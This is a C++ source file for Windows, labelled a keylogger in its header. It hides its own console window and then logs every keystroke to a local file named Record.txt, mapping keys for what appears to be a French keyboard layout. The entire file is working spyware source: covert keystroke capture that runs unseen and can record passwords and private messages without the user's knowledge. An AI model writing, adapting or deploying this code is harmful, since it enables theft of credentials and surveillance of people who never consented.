//============================================================================
// Name        : klogger.cpp
// Description : Keylogger in C++
//============================================================================

#include <iostream>
#include <windows.h>
#include <Winuser.h>
#include <fstream>

using namespace std;

void hide ()
{
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
}
void log ()
{
     char key;

     for (;;)
     {
          Sleep(25);

          for(key=8; key <= 222; key++)
          {
               if (GetAsyncKeyState(key) == -32767)
               {
                    ofstream write ("Record.txt", ios::app);


                    if ((key>64) && (key<91) && !(GetAsyncKeyState(0x10)))

                    {

                         key += 32;
                         write << key;
                         write.close();
                         break;
                    }


                    else if ((key > 64) && (key < 91))
                    {

                         write << key;
                         write.close();
                         break;
                    }


                    else
                    {
                         switch(key)
                         {
                              case 58:
                              {
                                   if(GetAsyncKeyState(0x10))
                                   {
                                        write << "0";
                                   }

                                   else
                                   {
                                        write << "à";
                                   }
                              }
                              break;

                              case 57:
                              {
                                   if(GetAsyncKeyState(0x10))
                                   {
                                        write << "9";
                                   }

                                   else
                                   {
                                        write << "ç";
                                   }
                              }
                              break;

                              case 56:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "8";
                                   }

                                   else
                                   {
                                        write << "!";
                                   }
                              }
                              break;

                              case 55:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "7";
                                   }

                                   else
                                   {
                                        write << "è";
                                   }
                              }
                              break;

                              case 54:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "6";
                                   }

                                   else
                                   {
                                        write << "§";
                                   }
                              }
                              break;

                              case 53:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "5";
                                   }

                                   else
                                   {
                                        write << "(";
                                   }
                              }
                              break;

                              case 52:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "4";
                                   }

                                   else
                                   {
                                        write << "'";
                                   }
                              }
                              break;

                              case 51:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << '3';
                                   }

                                   else
                                   {
                                        write << '"';
                                   }
                              }
                              break;

                              case 50:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "2";
                                   }

                                   else
                                   {
                                        write << "é";
                                   }
                              }
                              break;

                              case 49:
                              {
                                   if( GetAsyncKeyState(0x10))
                                   {
                                        write << "1";
                                   }

                                   else
                                   {
                                        write << "&";
                                   }
                              }
                              break;

                              case VK_SPACE:
                              {
                                   write << " ";
                              }
                              break;

                              case VK_RETURN:
                              {
                                   write << " \n";
                              }
                              break;

                              case VK_TAB:
                              {
                                   write << "     ";
                              }
                              break;

                              case VK_BACK:
                              {
                                   write << "<BackSpace>";
                              }
                              break;

                              case VK_ESCAPE:
                              {
                                   write << "<Esc>";
                              }
                              break;

                              case VK_DELETE:
                              {
                                   write << "<Delete>";
                              }
                              break;

                              default:
                                   write << key;
                         }
                    }
               }
          }
     }

}

int main()
{
     hide();
     log();
     return 0;
}

